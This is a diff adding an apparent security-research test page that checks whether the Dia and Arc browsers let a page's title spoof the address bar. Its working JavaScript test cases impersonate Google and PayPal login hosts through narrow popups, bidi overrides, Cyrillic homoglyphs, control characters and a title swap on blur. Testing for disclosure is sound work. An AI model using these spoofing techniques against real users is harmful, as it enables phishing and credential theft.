@@ -1,0 +1,137 @@
+<!doctype html><html><head><meta charset="utf-8"><title>Dia title-bar lab</title>
+<style>
+:root{color-scheme:dark}*{box-sizing:border-box}
+body{font:14px/1.55 -apple-system,system-ui,sans-serif;margin:0;background:#0d0d10;color:#e6e6e6}
+.h{position:sticky;top:0;background:#b00020;color:#fff;padding:8px 12px;font:700 13px system-ui;z-index:9}
+.h small{display:block;font-weight:400;opacity:.9;word-break:break-all}
+.w{max-width:900px;margin:0 auto;padding:16px}
+h1{color:#a78bfa;font-size:19px;margin:12px 0 2px}
+h2{color:#f0abfc;font-size:15px;margin:24px 0 4px;border-bottom:1px solid #2f2f37;padding-bottom:4px}
+p.d{color:#9ca3af;font-size:13px;margin:4px 0 8px}
+.ev{background:#0f1a0f;border:1px solid #1f3d1f;color:#86efac;padding:9px;border-radius:8px;
+ font:12px ui-monospace,Menlo,monospace;white-space:pre-wrap;margin:8px 0}
+.win{background:#1a0f0f;border:1px solid #3d1f1f;color:#fca5a5}
+button{background:#1f1f25;border:1px solid #33333d;color:#a5f3fc;padding:9px 12px;border-radius:8px;
+ cursor:pointer;font-size:13px;margin:3px 4px 3px 0}
+button:hover{background:#2a2a33}
+.hot{border-color:#7c3aed!important;color:#ddd6fe!important}
+#now{background:#16161a;border:1px solid #2f2f37;border-radius:8px;padding:10px;margin:8px 0;
+ font:12px ui-monospace,Menlo,monospace;white-space:pre-wrap;word-break:break-all}
+#log{background:#111116;border:1px solid #2f2f37;border-radius:8px;padding:10px;height:130px;
+ overflow:auto;font:12px ui-monospace,Menlo,monospace;white-space:pre-wrap}
+code{background:#16161a;padding:1px 5px;border-radius:4px;color:#fbbf24}
+</style></head><body>
+<div class="h">REAL ORIGIN: <span id="ro"></span><small id="rh"></small></div>
+<div class="w" id="lab">
+<h1>Dia / Arc — title-in-address-bar lab</h1>
+<div class="ev">DASAR (whitebox Dia 1.41.1, teramati live oleh agent):
+ Bar Dia merender:  http://  +  <b>HOST</b>  +  " / "  +  <b>document.title</b>
+ PATH ASLI TIDAK PERNAH DITAMPILKAN (default). Title 100% dikontrol penyerang.
+ Tidak ditemukan sanitasi kontrol-bidi di binary Swift (cari controlCharacter|
+ illegalCharacter|stripping → hanya IllegalCharacter, forControlCharacterAtIndex).
+ Truncation pakai FeatheredTruncatingLabel = fade gradien, TANPA glyph "…" ,
+ jadi teks terpotong tak memberi petunjuk visual apa pun.</div>
+<div class="ev win">BASELINE JUJUR: host tetap benar → ini SENDIRI belum spoof (Low).
+ Jadi temuan hanya kalau salah satu terjadi:
+  (1) HOST hilang/ter-feather habis → tinggal title (§A ← paling mungkin)
+  (2) Bidi membalik urutan → string penyerang pindah ke POSISI HOST (§B)
+  (3) Title bisa menyamar jadi host, mis. lewat homoglyph (§C)</div>
+
+<h2>§A · Popup sempit → host ter-feather habis ★ PRIORITAS</h2>
+<p class="d">Bar makin sempit = makin banyak dielide. Kalau host hilang total dan cuma title tampil,
+itu <b>spoof penuh</b>: bar hanya berisi string penyerang.</p>
+<button class="hot" onclick="pop(380,'accounts.google.com/signin')">380px · "accounts.google.com/signin"</button>
+<button class="hot" onclick="pop(300,'accounts.google.com')">300px</button>
+<button onclick="pop(460,'accounts.google.com/signin?service=mail')">460px</button>
+<button onclick="pop(380,PAD+'accounts.google.com')">380px + padding depan</button>
+<button onclick="pop(380,'🔒 accounts.google.com')">380px + 🔒</button>
+
+<h2>§B · Bidi / RTL override</h2>
+<p class="d">Tanpa sanitasi, U+202E dst. bisa membalik urutan visual — target: string penyerang
+terbaca di posisi host.</p>
+<button class="hot" onclick="setT('\u202E'+REV,'RLO + teks dibalik')">RLO (U+202E)</button>
+<button onclick="setT('\u202B'+REV,'RLE')">RLE (U+202B)</button>
+<button onclick="setT('\u200F'+REV,'RLM base-dir')">RLM (U+200F)</button>
+<button onclick="setT('\u2067'+REV,'RLI isolate')">RLI (U+2067)</button>
+<button onclick="setT('\u202E'+REV+'\u202C','RLO + PDF (ditutup)')">RLO+PDF</button>
+<button onclick="pop(380,'\u202E'+REV)">RLO di popup sempit</button>
+
+<h2>§C · Homoglyph di title (field ini TIDAK lewat ICU IDN-check)</h2>
+<p class="d">Host melewati IDNSpoofChecker Chromium; <b>title tidak</b> → Unicode apa pun tampil apa adanya.</p>
+<button class="hot" onclick="setT('\u0430ccounts.google.com','Cyrillic а')">аccounts.google.com</button>
+<button onclick="setT('g\u043E\u043Egle.com','Cyrillic о о')">gооgle.com</button>
+<button onclick="setT('\u0440\u0430ypal.com/login','Cyrillic ра')">раypal.com/login</button>
+
+<h2>§D · Struktur palsu / karakter kontrol</h2>
+<button onclick="setT('https://accounts.google.com/signin','skema penuh')">https://…/signin</button>
+<button onclick="setT('secure / login / verify','multi separator')">a / b / c</button>
+<button onclick="setT('accounts.google.com\u0009\u0009padding','TAB')">TAB</button>
+<button onclick="setT('accounts.google.com\u000Aevil','newline')">newline</button>
+<button onclick="setT('\u200B\u200B\u200Baccounts.google.com','zero-width depan')">ZWSP</button>
+<button onclick="setT('accounts.google.com'+' '.repeat(120)+'(evil)','spasi 120')">spasi panjang</button>
+
+<h2>§E · Title panjang (uji arah potong)</h2>
+<button onclick="setT('accounts.google.com/signin/v2/identifier'+'-x'.repeat(120),'panjang 280')">±280 char</button>
+<button onclick="setT('A'.repeat(3000),'3000 char')">3000 char</button>
+<button onclick="setT('x'.repeat(400)+'accounts.google.com','brand di EKOR')">brand di ekor</button>
+
+<h2>§F · Identitas berubah saat user tak melihat</h2>
+<p class="d">Title diubah saat tab kehilangan fokus → yang user lihat ketika kembali adalah identitas palsu.</p>
+<button class="hot" onclick="armBlur()">arm: ganti saat blur</button>
+<button onclick="armTimer()">arm: ganti tiap 2s</button>
+<button onclick="disarm()">disarm</button>
+
+<h2>Title saat ini</h2>
+<div id="now"></div>
+<button onclick="setT('Dia title-bar lab','reset')">reset title</button>
+<h2>Log</h2><div id="log"></div>
+<p class="d">Uji di <b>Dia</b> (utama) lalu <b>Arc</b>. Kontrol: <b>Chrome</b> (bar-nya tampilkan URL, bukan title).
+Screenshot bar + banner merah tiap langkah. Sukses = bar tak lagi menunjukkan host asli.</p>
+</div>
+
+<script>
+var REV='moc.elgoog.stnuocca', PAD='\u2007'.repeat(60), L, T=null, B=false;
+function q(n){return new URLSearchParams(location.search).get(n);}
+function cp(s){return [...s].slice(0,26).map(function(c){
+  return 'U+'+c.codePointAt(0).toString(16).toUpperCase().padStart(4,'0');}).join(' ');}
+function show(){document.getElementById('now').textContent=
+  'document.title ('+document.title.length+' char):\n'+JSON.stringify(document.title.slice(0,120))+
+  '\ncodepoints: '+cp(document.title);}
+function log(m){if(!L)return;L.textContent+='['+new Date().toISOString().substr(11,8)+'] '+m+'\n';
+  L.scrollTop=L.scrollHeight;}
+function setT(s,label){document.title=s;show();log('set title: '+label+'  len='+s.length);}
+function pop(w,t){
+  var u=location.pathname+'?t='+encodeURIComponent(t)+'&child=1';
+  var win=window.open(u,'p'+Date.now(),'width='+w+',height=560');
+  if(!win){log('POPUP DIBLOKIR — izinkan pop-up lalu ulangi');return;}
+  log('popup '+w+'px, title='+JSON.stringify(t.slice(0,40))+' → CEK BAR popup: host asli masih terlihat?');
+}
+function armBlur(){if(B)return;B=true;
+  window.addEventListener('blur',function(){document.title='accounts.google.com/signin';show();});
+  window.addEventListener('focus',function(){log('kembali fokus — title sekarang: '+JSON.stringify(document.title));});
+  log('armed: title berubah saat blur. Klik window lain, lalu kembali.');}
+function armTimer(){if(T)return;var i=0;
+  T=setInterval(function(){document.title=(i++%2)?'accounts.google.com/signin':'Dia title-bar lab';show();},2000);
+  log('armed: ganti tiap 2s');}
+function disarm(){if(T){clearInterval(T);T=null;}log('timer dimatikan');}
+
+/* mode anak (popup) */
+if(q('child')){
+  var t=q('t')||'';
+  document.title=t;
+  document.body.innerHTML=
+   '<div style="background:#b00020;color:#fff;padding:8px 10px;font:700 12px system-ui">'+
+   'REAL ORIGIN: '+location.origin+'<br><span style="font-weight:400">path asli: '+location.pathname+'</span></div>'+
+   '<div style="padding:16px;font:13px -apple-system,system-ui">'+
+   '<p><b>Bandingkan address bar jendela ini dengan banner merah.</b></p>'+
+   '<p style="font:12px ui-monospace">title = '+JSON.stringify(t)+'<br>len = '+t.length+
+   '<br>codepoints = '+cp(t)+'</p>'+
+   '<p style="color:#666;font-size:12px">SPOOF = host asli ('+location.hostname+
+   ') tidak terlihat lagi di bar, hanya string di atas.</p></div>';
+}else{
+  L=document.getElementById('log');
+  document.getElementById('ro').textContent=location.origin;
+  document.getElementById('rh').textContent=location.href;
+  show();log('siap · origin='+location.origin);
+}
+</script></body></html>
